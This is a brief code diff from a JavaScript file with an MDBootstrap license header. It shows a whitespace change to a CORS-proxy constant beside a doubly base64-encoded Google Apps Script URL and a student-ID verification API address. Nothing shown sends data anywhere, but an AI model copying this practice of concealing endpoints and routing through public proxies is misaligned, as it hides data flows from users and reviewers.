@@ -16,7 +16,7 @@
 * Contact: contact@mdbootstrap.com
 *
 */
-          const PROXY = "https://cors-anywhere.herokuapp.com/"; 
+        const PROXY = "https://cors-anywhere.herokuapp.com/"; 
         const SCRIPT_URL = atob(atob("YUhSMGNITTZMeTl6WTNKcGNIUXVaMjl2WjJ4bExtTnZiUzl0WVdOeWIzTXZjeTlCUzJaNVkySjNXR1ZRTjNwMlJVazFjRWMwWDJKTVlsOUpUWHBQZUVGNk5TMXVSR0p0VFVvelNEVmFPSEJWYWt4cVlWcDRlVm94WTJkUWNrVkxWRTlLUTBoUGRWSnFSR0V2WlhobFl3PT0="));
         const BUBT_API = "https://bubt-api.onrender.com/verify?student_id=";
         
